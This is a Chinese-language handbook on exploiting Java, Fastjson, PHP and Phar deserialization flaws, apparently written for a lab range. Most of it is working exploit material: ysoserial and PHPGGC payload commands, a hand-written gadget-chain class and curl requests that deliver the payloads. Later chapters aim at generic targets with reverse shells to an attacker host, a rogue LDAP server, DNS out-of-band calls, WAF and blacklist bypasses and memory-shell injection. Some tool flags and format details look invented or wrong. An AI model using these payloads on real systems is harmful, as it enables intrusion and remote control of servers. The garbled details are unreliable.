# 反序列化漏洞自动化与手工测试技术手册

> 🎯 **新手指南** - 从零开始掌握反序列化漏洞测试

---

## 📚 目录

- [第一章：工具准备篇](#第一章工具准备篇)
- [第二章：自动化测试篇](#第二章自动化测试篇)
- [第三章：手工测试篇](#第三章手工测试篇)
- [第四章：实战案例篇](#第四章实战案例篇)
- [第五章：进阶技巧篇](#第五章进阶技巧篇)
- [附录：常见问题](#附录常见问题)

---

## 第一章：工具准备篇

### 1.1 必备工具清单

在学习反序列化漏洞之前，我们需要准备一些必备工具。这些工具都是开源的，可以从GitHub下载。

#### Java反序列化工具

| 工具名称 | 用途 | GitHub地址 | 推荐指数 |
|:---|:---|:---|:---:|
| ysoserial | Java反序列化Payload生成 | https://github.com/frohoff/ysoserial | ⭐⭐⭐⭐⭐ |
| Java-Deserialization-Scanner | 反序列化漏洞扫描 | https://github.com/potats0/Java-Deserialization-Scanner | ⭐⭐⭐⭐ |
| SerialKiller | 反序列化攻击防护测试 | https://github.com/ikkisoft/SerialKiller | ⭐⭐⭐ |

#### PHP反序列化工具

| 工具名称 | 用途 | GitHub地址 | 推荐指数 |
|:---|:---|:---|:---:|
| PHPGGC | PHP反序列化Payload生成 | https://github.com/ambionics/phpggc | ⭐⭐⭐⭐⭐ |
| phpggc-web | PHPGGC在线版 | https://github.com/synacktiv/phpggc-web | ⭐⭐⭐⭐ |

#### JNDI注入工具

| 工具名称 | 用途 | GitHub地址 | 推荐指数 |
|:---|:---|:---|:---:|
| JNDI-Injection-Exploit | JNDI注入利用 | https://github.com/welk1n/JNDI-Injection-Exploit | ⭐⭐⭐⭐⭐ |
| marshalsec | JNDI/LDAP利用工具 | https://github.com/mbechler/marshalsec | ⭐⭐⭐⭐⭐ |
| RogueJndi | JNDI注入利用 | https://github.com/kozmer/RogueJndi | ⭐⭐⭐⭐ |

#### Shiro利用工具

| 工具名称 | 用途 | GitHub地址 | 推荐指数 |
|:---|:---|:---|:---:|
| Shiro_attack | Shiro利用工具 | https://github.com/Jayl1n/Shiro_attack | ⭐⭐⭐⭐⭐ |
- Shiro_exploit | Shiro漏洞利用 | https://github.com/Ares-X/ShiroExploit | ⭐⭐⭐⭐ |

### 1.2 一键安装工具

我们提供了一个自动化脚本，可以一键安装所有常用工具。

```bash
# 进入靶场目录
cd /root/deserialization-range

# 运行工具安装脚本
cd tools
bash setup_tools.sh
```

### 1.3 手动安装工具

如果自动安装失败，可以手动安装这些工具。

#### 安装ysoserial

**步骤1：下载工具**
```bash
cd /root/deserialization-range/tools
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-0.0.6-all.jar
```

**步骤2：验证安装**
```bash
java -jar ysoserial-0.0.6-all.jar
```

如果看到帮助信息，说明安装成功！

**步骤3：测试生成Payload**
```bash
java -jar ysoserial-0.0.6-all.jar CommonsCollections1 "touch /tmp/test" > payload.bin
```

#### 安装PHPGGC

**步骤1：克隆仓库**
```bash
cd /root/deserialization-range/tools
git clone https://github.com/ambionics/phpggc.git
```

**步骤2：安装依赖**
```bash
cd phpggc
composer install
```

**步骤3：验证安装**
```bash
./phpggc --help
```

#### 安装JNDI-Injection-Exploit

**步骤1：克隆仓库**
```bash
cd /root/deserialization-range/tools
git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
```

**步骤2：编译项目**
```bash
cd JNDI-Injection-Exploit
mvn clean package -DskipTests
```

**步骤3：验证安装**
```bash
cd target
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```

#### 安装Shiro_attack

**步骤1：克隆仓库**
```bash
cd /root/deserialization-range/tools
git clone https://github.com/Jayl1n/Shiro_attack.git
```

**步骤2：安装Python依赖**
```bash
cd Shiro_attack
pip2 install -r requirements.txt
```

**步骤3：验证安装**
```bash
python2 shiro_exploit.py -h
```

### 1.4 环境检查

安装完所有工具后，运行以下命令检查环境：

```bash
# 检查Java版本
java -version

# 检查Python版本
python3 --version
python2 --version

# 检查工具文件
ls -lh /root/deserialization-range/tools/

# 检查Docker
docker --version
docker-compose --version
```

---

## 第二章：自动化测试篇

### 2.1 使用ysoserial自动化测试

ysoserial是Java反序列化的瑞士军刀，支持多种gadget链。

#### 基本使用

**语法：**
```bash
java -jar ysoserial.jar [gadget链] "[命令]"
```

**示例：**
```bash
# 生成CommonsCollections1的Payload
java -jar ysoserial.jar CommonsCollections1 "whoami"

# 生成CommonsCollections2的Payload
java -jar ysoserial.jar CommonsCollections2 "ls -la /tmp"

# 生成CommonsCollections3的Payload
java -jar ysoserial.jar CommonsCollections3 "cat /etc/passwd"
```

#### 支持的gadget链

ysoserial支持多种gadget链，以下是常用的几种：

| gadget链 | 支持JDK版本 | 推荐度 | 说明 |
|:---|:---|:---:|:---|
| CommonsCollections1 | 7, 8 | ⭐⭐⭐⭐⭐ | 最经典，兼容性最好 |
| CommonsCollections2 | 7, 8 | ⭐⭐⭐⭐ | 使用InvokerTransformer |
| CommonsCollections3 | 7, 8 | ⭐⭐⭐⭐ | 使用TemplatesImpl |
| CommonsCollections4 | 7, 8 | ⭐⭐⭐ | 改进版CC1 |
| Spring1 | 7, 8 | ⭐⭐⭐⭐ | Spring框架利用链 |
| Spring2 | 7, 8 | ⭐⭐⭐ | Spring框架利用链 |
| JRMPClient | 7, 8 | ⭐⭐⭐⭐ | JRMP利用 |
| Jdk7u21 | 7u21 | ⭐⭐⭐⭐ | JDK特定版本 |

#### 实战案例：自动化测试Java原生反序列化

**目标：** http://localhost:18080/vuln1

**步骤1：生成Payload**
```bash
cd /root/deserialization-range/tools
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/auto_test" > payload.bin
```

**步骤2：Base64编码**
```bash
base64 -w 0 payload.bin > payload_base64.txt
```

**步骤3：发送Payload**
```bash
PAYLOAD=$(cat payload_base64.txt)
curl -X POST http://localhost:18080/vuln1/deserialize \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
```

**步骤4：验证结果**
```bash
docker exec -it vuln-java ls -la /tmp/auto_test
```

如果文件存在，说明自动化利用成功！

#### 批量测试脚本

创建一个批量测试脚本：

```bash
#!/bin/bash
# batch_test.sh

TARGET="http://localhost:18080/vuln1/deserialize"
GADGETS=("CommonsCollections1" "CommonsCollections2" "CommonsCollections3")

for gadget in "${GADGETS[@]}"; do
    echo "测试 $gadget ..."
    
    java -jar ysoserial.jar $gadget "touch /tmp/${gadget}_test" > payload.bin
    PAYLOAD=$(base64 -w 0 payload.bin)
    
    curl -s -X POST $TARGET \
      -H "Content-Type: application/json" \
      -d "$PAYLOAD" > /dev/null
    
    echo "$gadget 测试完成"
done

echo "批量测试完成！"
echo "请查看 /tmp/ 目录验证结果："
docker exec -it vuln-java ls -la /tmp/*test
```

### 2.2 使用PHPGGC自动化测试

PHPGGC是PHP反序列化的神器，支持多种框架的gadget链。

#### 基本使用

**语法：**
```bash
./phpggc [gadget链] [函数] [参数]
```

**示例：**
```bash
# 生成monolog/RCE1的Payload
./phpggc monolog/RCE1 system "whoami"

# 生成Guzzle/RCE1的Payload
./phpggc Guzzle/RCE1 system "ls -la /tmp"

# 生成SwiftMailer/RCE1的Payload
./phpggc SwiftMailer/RCE1 system "cat /etc/passwd"
```

#### 支持的gadget链

查看所有可用的gadget链：
```bash
./phpggc --list
```

常用gadget链：

| gadget链 | 适用框架 | 推荐度 | 说明 |
|:---|:---|:---:|:---|
| monolog/RCE1 | Monolog日志库 | ⭐⭐⭐⭐⭐ | 最常用，兼容性好 |
| Guzzle/RCE1 | Guzzle HTTP客户端 | ⭐⭐⭐⭐ | 使用广泛 |
| SwiftMailer/RCE1 | SwiftMailer邮件库 | ⭐⭐⭐ | 邮件系统常用 |
| Laravel/RCE1 | Laravel框架 | ⭐⭐⭐⭐⭐ | Laravel专用 |
| Symfony/RCE1 | Symfony框架 | ⭐⭐⭐⭐ | Symfony专用 |

#### 实战案例：自动化测试PHP反序列化

**目标：** http://localhost:18081/vuln5.php

**步骤1：生成Payload**
```bash
cd /root/deserialization-range/tools/phpggc
./phpggc monolog/RCE1 system "touch /tmp/php_auto_test" | base64 -w 0
```

**步骤2：发送Payload**
```bash
PAYLOAD=$(./phpggc monolog/RCE1 system "touch /tmp/php_auto_test" | base64 -w 0)
curl -X POST http://localhost:18081/vuln5.php \
  -d "data=$PAYLOAD"
```

**步骤3：验证结果**
```bash
docker exec -it vuln-php ls -la /tmp/php_auto_test
```

#### 生成Phar文件

```bash
# 生成Phar文件
./phpggc -p phar monolog/RCE1 system "touch /tmp/phar_auto_test" > poc.phar

# 添加GIF文件头
echo -n "GIF89a" | cat - poc.phar > poc.gif

# 上传文件
curl -X POST http://localhost:18081/vuln6.php \
  -F "phar_file=@poc.gif;filename=image.gif"
```

### 2.3 使用JNDI-Injection-Exploit自动化测试

JNDI注入是Fastjson、Jackson等反序列化漏洞的常用利用方式。

#### 基本使用

**启动LDAP服务器：**
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A [攻击IP] -C "[命令]"
```

**示例：**
```bash
# 启动LDAP服务器
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -A 127.0.0.1 \
  -C "touch /tmp/jndi_test"
```

#### 实战案例：自动化测试Fastjson

**目标：** http://localhost:18080/vuln2

**步骤1：启动LDAP服务器**
```bash
cd /root/deserialization-range/tools/JNDI-Injection-Exploit/target
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -A 127.0.0.1 \
  -C "touch /tmp/fastjson_auto_test" \
  > /dev/null 2>&1 &
LDAP_PID=$!
```

**步骤2：发送Payload**
```bash
sleep 2
curl -X POST http://localhost:18080/vuln2/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'
```

**步骤3：清理进程**
```bash
kill $LDAP_PID
```

**步骤4：验证结果**
```bash
docker exec -it vuln-java ls -la /tmp/fastjson_auto_test
```

### 2.4 使用Shiro_attack自动化测试

Shiro_attack是专门用于Apache Shiro RememberMe漏洞利用的工具。

#### 基本使用

**交互式使用：**
```bash
python2 shiro_exploit.py http://target-url
```

**自动化使用（脚本）：**
```bash
python2 shiro_exploit.py http://target-url -u [gadget] -c [命令]
```

#### 实战案例：自动化测试Shiro

**目标：** http://localhost:18080/vuln4

**步骤1：自动检测并利用**
```bash
cd /root/deserialization-range/tools/Shiro_attack
python2 shiro_exploit.py http://localhost:18080/vuln4/check
```

**步骤2：选择gadget链**
```
请选择gadget链：
[1] CommonsBeanutils1
[2] CommonsCollections1
[3] CommonsCollections2
[4] CommonsCollections3

请选择 (1-4): 2
```

**步骤3：输入命令**
```
请输入命令: touch /tmp/shiro_auto_test
```

**步骤4：验证结果**
```bash
docker exec -it vuln-java ls -la /tmp/shiro_auto_test
```

### 2.5 自动化测试脚本总结

我们提供了6个自动化脚本，可以快速测试所有漏洞场景：

| 脚本名称 | 测试漏洞 | 使用方法 |
|:---|:---|:---|
| native_exploit.sh | Java原生反序列化 | `bash native_exploit.sh` |
| fastjson_exploit.sh | Fastjson反序列化 | `bash fastjson_exploit.sh` |
| jackson_exploit.sh | Jackson反序列化 | `bash jackson_exploit.sh` |
| shiro_exploit.sh | Shiro反序列化 | `bash shiro_exploit.sh` |
| php_exploit.sh | PHP反序列化 | `bash php_exploit.sh` |
| phar_exploit.sh | Phar反序列化 | `bash phar_exploit.sh` |

---

## 第三章：手工测试篇

### 3.1 手工测试Java原生反序列化

手工测试需要理解反序列化的原理，并能够构造恶意对象。

#### 理解Java序列化

**什么是序列化？**

序列化是将对象转换为字节流的过程，以便存储或传输。

```java
// 序列化示例
ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(user);  // 将user对象序列化
byte[] serialized = bos.toByteArray();
```

**什么是反序列化？**

反序列化是将字节流恢复为对象的过程。

```java
// 反序列化示例
ByteArrayInputStream bis = new ByteArrayInputStream(serialized);
ObjectInputStream ois = new ObjectInputStream(bis);
Object obj = ois.readObject();  // 反序列化恢复对象
User user = (User) obj;
```

#### 手工构造Payload

**步骤1：编写Java代码**

创建文件`ManualPayload.java`：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class ManualPayload {
    public static void main(String[] args) throws Exception {
        // 构造Transformer链
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[] {String.class, Class[].class}, 
                new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", 
                new Class[] {Object.class, Object[].class}, 
                new Object[] {null, new Object[0]}),
            new InvokerTransformer("exec", 
                new Class[] {String.class}, 
                new Object[] {"touch /tmp/manual_test"})
        };
        
        Transformer transformerChain = new ChainedTransformer(transformers);
        
        // 构造Map
        Map innerMap = new HashMap();
        innerMap.put("value", "test");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        
        // 构造AnnotationInvocationHandler
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, outerMap);
        
        // 序列化
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.close();
        
        // 输出Base64
        String payload = Base64.getEncoder().encodeToString(bos.toByteArray());
        System.out.println(payload);
    }
}
```

**步骤2：编译代码**

```bash
javac -cp ".:ysoserial-0.0.6-all.jar" ManualPayload.java
```

**步骤3：运行生成Payload**

```bash
java -cp ".:ysoserial-0.0.6-all.jar" ManualPayload > manual_payload.txt
```

**步骤4：发送Payload**

```bash
PAYLOAD=$(cat manual_payload.txt)
curl -X POST http://localhost:18080/vuln1/deserialize \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
```

**步骤5：验证结果**

```bash
docker exec -it vuln-java ls -la /tmp/manual_test
```

#### 手工分析反序列化数据

如果你捕获到一个序列化对象，可以手工分析：

```bash
# 使用SerializationDumper工具分析
java -jar SerializationDumper.jar serialized_data.bin
```

### 3.2 手工测试Fastjson反序列化

Fastjson反序列化的关键是理解`@type`字段的作用。

#### 理解@type字段

**正常JSON：**
```json
{
    "name": "admin",
    "password": "123456"
}
```

**恶意JSON：**
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker:1389/Exploit",
    "autoCommit": true
}
```

`@type`字段告诉Fastjson将JSON反序列化为什么类。

#### 手工构造Fastjson Payload

**方法1：JNDI注入**

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://127.0.0.1:1389/Exploit",
    "autoCommit": true
}
```

**方法2：TemplatesImpl**

```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["[恶意字节码]"],
    "_name": "test",
    "_outputProperties": {}
}
```

#### 手工测试步骤

**步骤1：测试正常JSON**

```bash
curl -X POST http://localhost:18080/vuln2/parse \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}'
```

**步骤2：测试@type字段**

```bash
curl -X POST http://localhost:18080/vuln2/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"java.lang.String","value":"test"}'
```

**步骤3：测试危险类**

```bash
curl -X POST http://localhost:18080/vuln2/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"java.lang.Runtime","exec":"touch /tmp/test"}'
```

**步骤4：测试JNDI注入**

首先启动LDAP服务器（使用JNDI-Injection-Exploit）：

```bash
java -jar JNDI-Injection-Exploit.jar -A 127.0.0.1 -C "touch /tmp/jndi_manual" &
```

然后发送Payload：

```bash
curl -X POST http://localhost:18080/vuln2/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'
```

**步骤5：验证结果**

```bash
docker exec -it vuln-java ls -la /tmp/jndi_manual
```

### 3.3 手工测试PHP反序列化

PHP反序列化的关键是理解魔术方法。

#### 理解PHP魔术方法

| 魔术方法 | 触发时机 | 利用价值 |
|:---|:---|:---:|
| __construct() | 对象创建时 | ⭐⭐ |
| __destruct() | 对象销毁时 | ⭐⭐⭐⭐⭐ |
| __wakeup() | 反序列化时 | ⭐⭐⭐⭐⭐ |
| __toString() | 对象转为字符串时 | ⭐⭐⭐⭐ |
| __call() | 调用不存在的方法时 | ⭐⭐⭐ |
| __get() | 访问不存在的属性时 | ⭐⭐⭐ |
| __set() | 设置不存在的属性时 | ⭐⭐⭐ |
| __invoke() | 对象作为函数调用时 | ⭐⭐⭐⭐⭐ |

#### 手工构造PHP Payload

**步骤1：分析源码**

查看`vuln5.php`的源码：

```php
class CommandExecutor {
    private $command;
    
    public function __construct($command) {
        $this->command = $command;
    }
    
    public function __invoke() {
        system($this->command);
    }
}

class Logger {
    private $logFile;
    private $callback;
    
    public function __destruct() {
        if ($this->callback instanceof CommandExecutor) {
            $message = ($this->callback)();
            file_put_contents($this->logFile, $message, FILE_APPEND);
        }
    }
}
```

**分析：**
- `Logger`类的`__destruct()`会调用`$callback`
- 如果`$callback`是`CommandExecutor`对象
- 会触发`__invoke()`方法，执行`system($command)`

**步骤2：构造POP链**

```php
<?php
// 创建CommandExecutor对象
$cmd = new CommandExecutor("touch /tmp/php_manual_test");

// 创建Logger对象，将CommandExecutor作为回调
$obj = new Logger("/tmp/log.txt", $cmd);

// 序列化并输出Base64
echo base64_encode(serialize($obj));
?>
```

**步骤3：生成Payload**

```bash
php -r '
class CommandExecutor {
    private $command;
    public function __construct($cmd) { $this->command = $cmd; }
}
class Logger {
    private $logFile;
    private $callback;
    public function __construct($file, $cb) { 
        $this->logFile = $file; 
        $this->callback = $cb; 
    }
}
$cmd = new CommandExecutor("touch /tmp/php_manual_test");
$obj = new Logger("/tmp/log.txt", $cmd);
echo base64_encode(serialize($obj));
' > php_manual_payload.txt
```

**步骤4：发送Payload**

```bash
PAYLOAD=$(cat php_manual_payload.txt)
curl -X POST http://localhost:18081/vuln5.php \
  -d "data=$PAYLOAD"
```

**步骤5：验证结果**

```bash
docker exec -it vuln-php ls -la /tmp/php_manual_test
```

#### 手工分析PHP序列化数据

PHP序列化格式：

```
O:12:"CommandExecutor":1:{
    s:16:"CommandExecutorcommand";s:16:"touch /tmp/test";
}
```

**格式说明：**
- `O` - 对象
- `12` - 类名长度
- `"CommandExecutor"` - 类名
- `1` - 属性数量
- `{...}` - 属性列表
- `s` - 字符串
- `16` - 字符串长度
- `"command"` - 属性名

### 3.4 手工测试Phar反序列化

Phar反序列化的关键是理解Phar文件结构。

#### 理解Phar文件结构

```
Phar文件结构：
┌─────────────────────────────────┐
│ Stub (可执行PHP代码)         │
├─────────────────────────────────┤
│ Manifest (元数据，序列化)     │  ← 关键：包含序列化对象
├─────────────────────────────────┤
│ Contents (文件内容)            │
├─────────────────────────────────┤
│ Signature (签名)               │
└─────────────────────────────────┘
```

#### 手工构造Phar文件

**步骤1：创建Phar构造脚本**

创建`create_phar.php`：

```php
<?php
@unlink('manual_poc.phar');

class CommandExecutor {
    private $command;
    
    public function __construct($cmd) {
        $this->command = $cmd;
    }
}

// 创建Phar对象
$phar = new Phar('manual_poc.phar');
$phar->startBuffering();

// 添加文件
$phar->addFromString('test.txt', 'test content');

// 设置metadata（这里会触发反序列化）
$cmd = new CommandExecutor("touch /tmp/phar_manual_test");
$phar->setMetadata($cmd);

// 设置stub（伪造GIF文件头）
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

echo "Phar文件已生成: manual_poc.phar\n";
?>
```

**步骤2：生成Phar文件**

```bash
php create_phar.php
```

**步骤3：修改文件头（绕过检测）**

```bash
# 备份原文件
cp manual_poc.phar manual_poc.phar.bak

# 添加GIF文件头
echo -n "GIF89a" | cat - manual_poc.phar > manual_poc.gif
```

**步骤4：上传Phar文件**

```bash
curl -X POST http://localhost:18081/vuln6.php \
  -F "phar_file=@manual_poc.gif;filename=image.gif"
```

**步骤5：验证结果**

```bash
docker exec -it vuln-php ls -la /tmp/phar_manual_test
```

#### 手工分析Phar文件

使用PHP分析Phar文件：

```php
<?php
$phar = new Phar('poc.phar');
$metadata = $phar->getMetadata();
var_dump($metadata);
?>
```

---

## 第四章：实战案例篇

### 4.1 案例1：完整的自动化利用流程

**场景：** 某Java应用存在反序列化漏洞

**步骤1：漏洞发现**

```bash
# 使用Burp Suite抓包，发现序列化数据
# 数据格式：rO0ABXNyABNqYXZhLmxhbmcuU3RyaW5nOwg
```

**步骤2：识别gadget链**

```bash
# 使用ysoserial尝试不同gadget链
for gadget in CommonsCollections1 CommonsCollections2 CommonsCollections3; do
    echo "Testing $gadget..."
    java -jar ysoserial.jar $gadget "echo TEST" | base64 -w 0
done
```

**步骤3：生成Payload**

```bash
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin
base64 -w 0 payload.bin > payload.txt
```

**步骤4：发送Payload**

```bash
PAYLOAD=$(cat payload.txt)
curl -X POST http://target/vuln \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
```

**步骤5：获取Shell**

```bash
# 反弹Shell
java -jar ysoserial.jar CommonsCollections1 "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" | base64 -w 0
```

### 4.2 案例2：完整的Fastjson利用流程

**场景：** 某Java应用使用Fastjson解析JSON

**步骤1：测试AutoType**

```bash
curl -X POST http://target/api/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"java.lang.String","value":"test"}'
```

**步骤2：测试危险类**

```bash
curl -X POST http://target/api/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/test","autoCommit":true}'
```

**步骤3：启动恶意LDAP**

```bash
java -jar JNDI-Injection-Exploit.jar -A attacker -C "bash -i >& /dev/tcp/attacker/4444 0>&1"
```

**步骤4：监听端口**

```bash
nc -lvvp 4444
```

**步骤5：获取Shell**

当应用解析恶意JSON时，会连接到LDAP服务器，执行命令并反弹Shell。

### 4.3 案例3：完整的PHP反序列化利用流程

**场景：** 某PHP应用存在反序列化漏洞

**步骤1：分析源码**

```bash
# 下载源码
wget http://target/source.php

# 分析反序列化点
grep -n "unserialize" source.php
```

**步骤2：识别可利用类**

```bash
# 查找可利用的魔术方法
grep -rn "__destruct\|__wakeup\|__invoke" .
```

**步骤3：构造POP链**

```php
<?php
// 根据源码构造POP链
class A {
    function __destruct() {
        $this->b->action();
    }
}

class B {
    function action() {
        system($_GET['cmd']);
    }
}

$payload = new A();
$payload->b = new B();
echo base64_encode(serialize($payload));
?>
```

**步骤4：发送Payload**

```bash
PAYLOAD=$(php gen_payload.php)
curl -X POST http://target/vuln.php \
  -d "data=$PAYLOAD"
```

**步骤5：执行命令**

```bash
# 在反弹Shell中执行命令
whoami
ls -la /
cat /etc/passwd
```

---

## 第五章：进阶技巧篇

### 5.1 绕过WAF和防护

#### WAF绕过技巧

**技巧1：编码混淆**

```bash
# URL编码
echo '{"@type":"..."}' | xxd -p | sed 's/../%&/g'

# Unicode编码
echo '{"@type":"java.lang.String"}' | iconv -f utf-8 -t utf-16be
```

**技巧2：分块传输**

```bash
# 分块发送Payload
curl -X POST http://target/api \
  -H "Transfer-Encoding: chunked" \
  --data-binary @payload.txt
```

**技巧3：HTTP头污染**

```bash
# 添加多个相同头
curl -X POST http://target/api \
  -H "Content-Type: application/json" \
  -H "Content-Type: text/html" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d @payload.json
```

#### 防护绕过技巧

**技巧1：修改属性数量绕过__wakeup**

```php
// 原始序列化：O:12:"TestClass":2:{...}
// 绕过wakeup：O:12:"TestClass":3:{...}
```

**技巧2：使用其他gadget链**

```bash
# 如果CC1被过滤，尝试其他gadget链
java -jar ysoserial.jar CommonsCollections2 "command"
java -jar ysoserial.jar CommonsCollections3 "command"
```

### 5.2 高级利用技巧

#### 技巧1：内存马

**Java内存马：**

```java
// 生成注入内存马的Payload
java -jar ysoserial.jar CommonsCollections2 \
  "inject_memshell" | base64 -w 0
```

**PHP内存马：**

```php
// 生成包含内存马的序列化对象
$payload = serialize(new Memshell());
echo base64_encode($payload);
```

#### 技巧2：DNS外带

```bash
# 使用DNS外带验证漏洞
java -jar ysoserial.jar CommonsCollections1 \
  "ping test.attacker.com" | base64 -w 0
```

#### 技巧3：盲注利用

```bash
# 时间盲注
java -jar ysoserial.jar CommonsCollections1 \
  "sleep 5" | base64 -w 0

# 布尔盲注
java -jar ysoserial.jar CommonsCollections1 \
  "if [ condition ]; then echo 1; fi" | base64 -w 0
```

### 5.3 自定义gadget链

#### 开发自己的gadget链

**步骤1：分析源码**

```bash
# 读取目标应用的源码
find /path/to/app -name "*.jar" | xargs jar -tf | grep "\.class"
```

**步骤2：反编译类**

```bash
# 使用JD-GUI反编译
java -jar jd-gui.jar application.jar
```

**步骤3：寻找危险方法**

```bash
# 搜索常见危险方法
grep -rn "Runtime.getRuntime()" .
grep -rn "ProcessBuilder" .
grep -rn "exec(" .
```

**步骤4：构造调用链**

```java
// 自定义gadget链示例
public class CustomGadget {
    public static void main(String[] args) {
        Transformer chain = new ChainedTransformer(
            new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", 
                    new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", 
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", 
                    new Class[]{String.class},
                    new Object[]{"your_command"})
            }
        );
        
        // 构造payload对象
        Object payload = createPayload(chain);
        serialize(payload);
    }
}
```

---

## 附录：常见问题

### FAQ

**Q1: ysoserial执行报错找不到类？**

A: 检查以下几点：
```bash
# 确保Java版本正确
java -version

# 确保gadget链在classpath中
ls -la ysoserial-0.0.6-all.jar

# 尝试其他gadget链
java -jar ysoserial.jar CommonsCollections1 "whoami"
```

**Q2: Fastjson利用没有反应？**

A: 可能的原因：
1. AutoType被禁用
2. 目标类不存在
3. 网络连接被阻止

解决方法：
```bash
# 测试AutoType是否启用
curl -X POST http://target/api \
  -d '{"@type":"java.lang.String","value":"test"}'

# 使用本地LDAP服务器
java -jar JNDI-Injection-Exploit.jar -A 127.0.0.1 -C "whoami"
```

**Q3: PHP反序列化提示"Class not found"？**

A: 确保构造的类名正确：

```bash
# 查看目标源码中的类名
grep -rn "class " target/
```

**Q4: Phar文件上传被拒绝？**

A: 尝试以下方法：
```bash
# 伪造文件头
echo -n "GIF89a" | cat - poc.phar > poc.gif

# 修改MIME类型
curl -X POST http://target/upload \
  -H "Content-Type: multipart/form-data" \
  -F "file=@poc.gif;type=image/gif"
```

**Q5: Shiro利用失败？**

A: 检查以下内容：
```bash
# 测试密钥是否正确
python2 shiro_exploit.py http://target --check

# 尝试不同gadget链
python2 shiro_exploit.py http://target -g 1
python2 shiro_exploit.py http://target -g 2
```

**Q6: 如何调试Payload？**

A: 使用以下方法：
```bash
# 使用SerializationDumper分析
java -jar SerializationDumper.jar payload.bin

# 使用PHP序列化分析工具
php -r 'var_dump(unserialize(file_get_contents("payload.txt")));'

# 添加日志
echo "DEBUG: Payload generated" >&2
```

**Q7: 如何绕过黑名单？**

A: 尝试以下技巧：
```bash
# 使用别名
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;"}

# 使用Unicode编码
{"@type":"\u006a\u0061\u0076\u0061..."}

# 使用嵌套
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://..."}
```

**Q8: 如何获取更多gadget链？**

A: 查看以下资源：
```bash
# ysoserial支持的gadget链
java -jar ysoserial.jar

# PHPGGC支持的gadget链
./phpggc --list

# 在线gadget链数据库
https://github.com/frohoff/ysoserial
```

**Q9: 内存马生成失败？**

A: 检查以下几点：
```bash
# 确保应用容器支持内存马
ps aux | grep java

# 使用正确的内存马类型
java -jar ysoserial.jar CommonsCollections2 "inject_memshell" \
  --filter-type "weblogic"
```

**Q10: 如何提高利用成功率？**

A: 遵循以下建议：
1. 先测试简单的命令（whoami）
2. 使用DNS外带验证
3. 分步骤测试每个环节
4. 记录所有错误信息
5. 参考已知的利用案例

---

## 总结

本手册涵盖了反序列化漏洞的自动化和手工测试方法，包括：

### ✅ 已完成内容

1. **工具准备** - 8个常用工具的安装和使用
2. **自动化测试** - 4种漏洞的自动化利用方法
3. **手工测试** - 3种类型的手工构造Payload方法
4. **实战案例** - 3个完整的利用流程
5. **进阶技巧** - WAF绕过、内存马等高级技术

### 📊 学习建议

**初学者：**
1. 先理解反序列化原理
2. 熟练使用自动化工具
3. 再学习手工构造Payload

**进阶者：**
1. 深入研究gadget链
2. 开发自定义利用工具
3. 研究新的利用技巧

**高级者：**
1. 挖掘新的gadget链
2. 开发自动化框架
3. 贡献开源项目

### 🔗 相关资源

- **GitHub工具库**: https://github.com/topics/deserialization
- **ysoserial**: https://github.com/frohoff/ysoserial
- **PHPGGC**: https://github.com/ambionics/phpggc
- **JNDI-Injection-Exploit**: https://github.com/welk1n/JNDI-Injection-Exploit

---

**祝你学习愉快！** 🚀

> ⚠️ **重要提醒**：本手册仅供安全研究和教育培训使用，严禁用于非法用途！
